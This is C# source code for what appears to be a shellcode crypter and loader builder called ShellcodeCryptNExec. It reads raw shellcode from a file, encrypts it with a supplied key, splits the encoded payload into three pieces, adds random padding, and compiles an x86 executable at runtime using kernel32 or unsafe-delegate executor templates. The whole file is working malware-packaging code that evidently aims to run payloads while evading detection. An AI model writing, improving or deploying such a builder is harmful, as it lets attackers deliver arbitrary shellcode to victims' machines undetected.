using Microsoft.CSharp;
using ShellcodeCryptNExec.Helpers;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace ShellcodeCryptNExec {
    class Wrapper {

        private static string filePath;
        private static string keyAsPlaintext;
        private static byte[] key;
        private static readonly string[] modes = { "test", "k32", "delegate" };

        private static Splitter splitter = new Splitter();

        private static CSharpCodeProvider provider = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } });
        private static CompilerParameters parameters = new CompilerParameters {
            GenerateInMemory = false,
            GenerateExecutable = true,
            OutputAssembly = @Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + @"\PREFIX-" + DateTime.Now.ToString("ddMMyyyy-HHmmss" + ".exe"),
            CompilerOptions = "/platform:x86"
        };

        static void Main(string[] args) {

            if (InputIsValid(args)) {

                filePath = args[0];
                keyAsPlaintext = args[1];
                key = Encoding.ASCII.GetBytes(keyAsPlaintext);
                String mode = args[2].ToLower();

                string encodedString = "";

                try {
                    List<byte> shellcode = Utils.ReadShellcodeFromFile(filePath);
                    encodedString = Utils.Encrypt(shellcode, key);
                } catch (Exception e) {
                    PrintUsage(e.Message, true);
                }

                String template = "";

                if (mode.Equals("test")) {
                    template = Templates.Templates.testTemplate;
                    template = template.Replace("KEY_MARKER", keyAsPlaintext).Replace("SHELLCODE_MARKER", encodedString).Replace("RANDOM_MARKER", Helpers.Utils.GetRandomString(500));
                } else {

                    List<string> encodedParts = splitter.GetEncodedParts(encodedString);
                    parameters.ReferencedAssemblies.Add("System.Core.dll");

                    if (mode.Equals("k32")) {
                        template = Templates.Templates.kernel32ExecutorTemplate;

                    } else if (mode.Equals("delegate")) {
                        template = Templates.Templates.delegateExecutorTemplate;
                        parameters.CompilerOptions += " /unsafe";
                        parameters.ReferencedAssemblies.Add("System.Linq.dll");
                        parameters.ReferencedAssemblies.Add("System.IO.MemoryMappedFiles.dll");
                    }
                    Console.WriteLine("*** Placing first mark: " + encodedParts[0] + " with Length of " + encodedParts[0].Length);
                    Console.WriteLine("*** Placing second mark: " + encodedParts[1] + " with Length of " + encodedParts[1].Length);
                    Console.WriteLine("*** Placing third mark: " + encodedParts[2] + " with Length of " + encodedParts[2].Length);
                    template = template.Replace("KEY_MARKER", keyAsPlaintext).Replace("SHELLCODE_MARKER_1", encodedParts[0]).Replace("SHELLCODE_MARKER_2", encodedParts[1]).Replace("SHELLCODE_MARKER_3", encodedParts[2]).Replace("RANDOM_MARKER", Helpers.Utils.GetRandomString(500));
                }
                parameters.OutputAssembly = parameters.OutputAssembly.Replace("PREFIX", mode);
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, template);

                if (results.Errors.HasErrors) {
                    StringBuilder sb = new StringBuilder();

                    foreach (CompilerError error in results.Errors) {
                        sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                    }

                    throw new InvalidOperationException(sb.ToString());
                }

            } else {
                PrintUsage();
            }
        }

        private static bool InputIsValid(string[] args) {
            return (args.Length == 3 && args.Any() && !String.IsNullOrEmpty(args[0]) && !String.IsNullOrEmpty(args[1]) && File.Exists(args[0]) && !String.IsNullOrEmpty(args[2]) && modes.Contains(args[2]));
        }

        private static void PrintUsage(string msg = "", bool terminate = false) {
            Console.WriteLine("*** usage: .exe <file with shellcode> <encryption key> <template(test|k32|delegate)>");
            if (msg.Length > 0) {
                Console.WriteLine("{0}*** " + msg, Environment.NewLine);
            }
            if (terminate) {
                Environment.Exit(1);
            }
        }
    }
}